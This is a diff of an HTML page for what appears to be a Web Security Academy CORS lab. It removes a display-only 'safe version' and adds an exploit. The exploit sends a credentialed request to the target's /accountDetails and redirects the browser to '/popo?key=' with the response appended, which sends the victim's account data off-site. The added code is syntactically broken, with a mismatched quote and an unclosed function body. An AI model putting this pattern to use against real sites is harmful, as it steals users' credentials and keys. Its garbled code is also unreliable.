@@ -1,55 +1,19 @@
-<hml>
+<html>
   <head>
     <title>
       
     </title>
-    
   </head>
-  <bodoy>
+  <body>
     <script>
-     
-  // safe version — same structure as your example but DOES NOT exfiltrate
-  var req = new XMLHttpRequest();
-  req.onload = reqListener;
-  // lab host you gave
-  req.open('GET', 'https://0af7003203820d368122348900da003f.web-security-academy.net/accountDetails', true);
-  req.withCredentials = true;
-  req.send();
-
-  function reqListener() {
-    // SAFE: show response in console and on the page instead of sending it elsewhere
-    console.log('responseText:', this.responseText);
-
-    // attempt to pretty-print JSON if possible
-    try {
-      var obj = JSON.parse(this.responseText);
-      var pretty = JSON.stringify(obj, null, 2);
-      // display in page (creates a pre element if not present)
-      var pre = document.getElementById('safe-output');
-      if (!pre) {
-        pre = document.createElement('pre');
-        pre.id = 'safe-output';
-        pre.style.whiteSpace = 'pre-wrap';
-        pre.style.background = '#0f172a';
-        pre.style.color = '#e6eef8';
-        pre.style.padding = '8px';
-        pre.style.borderRadius = '6px';
-        pre.style.margin = '8px 0';
-        document.body.appendChild(pre);
-      }
-      pre.textContent = pretty;
-    } catch (e) {
-      // not JSON — show raw text
-      var el = document.getElementById('safe-output') || document.createElement('pre');
-      el.id = 'safe-output';
-      el.textContent = this.responseText;
-      if (!document.getElementById('safe-output')) document.body.appendChild(el);
-    }
-  };
+      const request = new XMLHttpRequest()
+      request.open('get,"0af7003203820d368122348900da003f.web-security-academy.net/accountDetails",true)
+      request.onload = ()=> {
+        window.location.href = "/popo?key= " + request.responseText
 
 
+      request.withCredentials = true
+      request.send()
     </script>
-  </bodoy>
-  
-</hml>
-
+  </body>
+</html>
